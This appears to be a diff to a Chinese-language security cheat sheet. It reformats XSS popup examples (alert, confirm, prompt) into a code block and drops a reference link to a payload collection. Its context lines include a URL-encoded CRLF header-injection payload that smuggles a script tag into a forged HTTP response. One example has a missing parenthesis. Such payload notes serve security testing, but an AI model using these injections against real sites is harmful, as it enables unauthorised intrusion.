@@ -3,13 +3,11 @@ Payload
 
 弹框
 ---------------------------------------------------
-+ ``alert('我是个弹窗');``
-    在浏览器中弹出警告框，提示用户一些信息。
-+ ``confirm('我是个确认弹窗?');``
-    在浏览器中弹出确认框，让用户进行确认或取消操作。
-+ ``prompt('我是个输入框';``
-    在浏览器中弹出输入框，让用户输入一些信息。
+::
 
+    alert('我是个弹窗');
+    confirm('我是个确认弹窗?');
+    prompt('我是个输入框';
 
 
 常用的XSS绕过payload
@@ -208,7 +206,3 @@ CRLF
 - Location
 
 	``%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert('XSS');%3C%2fscript%3E``
-
-参考
----------------------------------
-+ ``https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/``
